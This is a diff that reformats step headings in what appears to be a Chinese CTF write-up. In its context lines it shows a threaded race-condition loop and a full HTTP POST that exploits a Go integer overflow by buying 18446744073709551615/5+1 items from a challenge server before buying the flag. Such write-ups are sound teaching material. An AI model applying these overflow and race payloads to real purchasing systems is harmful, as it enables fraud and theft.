@@ -41,7 +41,8 @@ for i in range(0xfffff):
     threading.Thread(target=AtoB).start()
 ```
 
-* step 2  利用golang的整数溢出漏洞购买 18446744073709551615/5 + 1 个超级大辣条
+* step 2  
+利用golang的整数溢出漏洞购买 18446744073709551615/5 + 1 个超级大辣条
 ```
 POST /buyltw HTTP/1.1
 Host: 117.78.26.155:31358
@@ -59,7 +60,8 @@ Connection: close
 number=3689348814741910324
 ```
 
-*step 3  购买flag
+*step 3  
+购买flag
 
 
 
